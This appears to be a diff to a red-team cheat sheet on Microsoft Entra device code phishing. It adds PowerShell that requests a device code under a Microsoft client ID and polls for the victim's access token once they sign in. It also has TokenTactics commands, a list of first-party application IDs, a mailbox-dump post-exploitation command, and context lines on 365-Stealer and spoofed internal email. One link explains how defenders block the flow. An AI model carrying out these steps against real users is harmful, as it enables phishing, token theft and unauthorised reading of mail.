@@ -331,21 +331,61 @@ python 365-Stealer.py --refresh-all
 Send-MailMessage -SmtpServer CompanyDomain-com.mail.protection.outlook.com -Subject “Subject Here” -To ‘Full Name <user2@companyDomain.com>‘ -From ‘From Full Name <user1@companyDomain.com>‘ -Body “Hello From your Co-worker” -BodyAsHtml
 ```
 
-### Device code auth
-- https://aadinternals.com/post/phishing/
-- https://www.offsec-journey.com/post/phishing-with-azure-device-codes
-- https://www.youtube.com/watch?v=GZ_nn0uRLr4
-
-### Example TokenTactics
-- https://github.com/rvrsh3ll/TokenTactics
+### Device code phishing
+- Login to devices that has limited input posibility, Like a smart TV.
+- Flow
+  - Enter code on device on https://microsoft.com/devicelogin
+  - Perform normal authentication, including MFA as user
+  - On successful login the device gets access and refresh tokens
+- Links
+  - https://aadinternals.com/post/phishing/
+  - https://www.offsec-journey.com/post/phishing-with-azure-device-codes
+  - https://www.youtube.com/watch?v=GZ_nn0uRLr4
+- Block device auth flow: https://learn.microsoft.com/en-us/entra/identity/conditional-access/how-to-policy-authentication-flows
 
 #### Request Device Code token
-- Copy the Device code
+- Code is only valid for 15 mi
+- Request it manually
+  - Uses version 2 of the device code auth flow
+  - Scope = all default permissions and offline access
+  - Copy the `user_code`
+```
+$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+$Scope = ".default offline_access"
+$GrantType = "urn:ietf:params:oauth:grant-type:device_code"
 
+$body = @{
+	"client_id" = $ClientID
+	"scope" = $Scope
+}
+
+$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri
+"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode" -Body $body
+
+Write-Output $authResponse
+```
+
+- https://github.com/rvrsh3ll/TokenTactics
 ```
 ipmo .\TokenTactics-main\TokenTactics.psd1
 
 Get-AzureToken -Client MSGraph
+```
+
+#### Common application ID's
+- https://learn.microsoft.com/en-us/troubleshoot/azure/active-directory/verify-first-party-apps-sign-in
+```
+ACOM Azure Website 	23523755-3a2b-41ca-9315-f81f3f566a95
+AEM-DualAuth 	69893ee3-dd10-4b1c-832d-4870354be3d8
+ASM Campaign Servicing 	0cb7b9ec-5336-483b-bc31-b15b5788de71
+Azure Advanced Threat Protection 	7b7531ad-5926-4f2d-8a1d-38495ad33e17
+Azure Data Lake 	e9f49c6b-5ce5-44c8-925d-015017e9f7ad
+Azure Lab Services Portal 	835b2a73-6e10-4aa5-a979-21dfda45231c
+Azure Portal 	c44b4083-3bb0-49c1-b47d-974e53cbdf3c
+AzureSupportCenter 	37182072-3c9c-4f6a-a4b3-b3f91cacffce
+Bing 	9ea1ad79-fdb6-4f9a-8bc3-2b70f96e34c7
+CPIM Service 	bb2a2e3a-c5e7-4f0a-88e0-8e01fd3fc1f4
+CRM Power BI Integration 	e64aa8bc-8eb4-40e2-898b-cf261a25954f
 ```
 
 #### Send device code to the target
@@ -359,28 +399,30 @@ Code: <CODE>
 ```
 
 #### Capture Access Token
-- Once the user registers the device, TokenTactics will capture the token. This is saved in `$response.access_token`
+- Manually saves in `$GraphAccessToken`
+```
+$body=@{
+	"client_id" = $ClientID
+	"grant_type" = $GrantType
+	"code" = $authResponse.device_code
+}
+$Tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri
+"https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body -ErrorAction SilentlyContinue
+$GraphAccessToken = $Tokens.access_token
+
+$GraphAccessToken 
+```
+
+- TokenTactics will capture the token. This is saved in `$response.access_token` variable.
+```
+$response.access_token
+```
 
 #### Post exploitation
 - Example dump mailbox with TokenTactics:
 ```
 Dump-OWAMailboxViaMSGraphApi -AccessToken $response.access_token -mailFolder  
 AllItems
-```
-
-#### Common application ID's
-```
-ACOM Azure Website 	23523755-3a2b-41ca-9315-f81f3f566a95
-AEM-DualAuth 	69893ee3-dd10-4b1c-832d-4870354be3d8
-ASM Campaign Servicing 	0cb7b9ec-5336-483b-bc31-b15b5788de71
-Azure Advanced Threat Protection 	7b7531ad-5926-4f2d-8a1d-38495ad33e17
-Azure Data Lake 	e9f49c6b-5ce5-44c8-925d-015017e9f7ad
-Azure Lab Services Portal 	835b2a73-6e10-4aa5-a979-21dfda45231c
-Azure Portal 	c44b4083-3bb0-49c1-b47d-974e53cbdf3c
-AzureSupportCenter 	37182072-3c9c-4f6a-a4b3-b3f91cacffce
-Bing 	9ea1ad79-fdb6-4f9a-8bc3-2b70f96e34c7
-CPIM Service 	bb2a2e3a-c5e7-4f0a-88e0-8e01fd3fc1f4
-CRM Power BI Integration 	e64aa8bc-8eb4-40e2-898b-cf261a25954f
 ```
 
 ### Google workspace calendar event injection
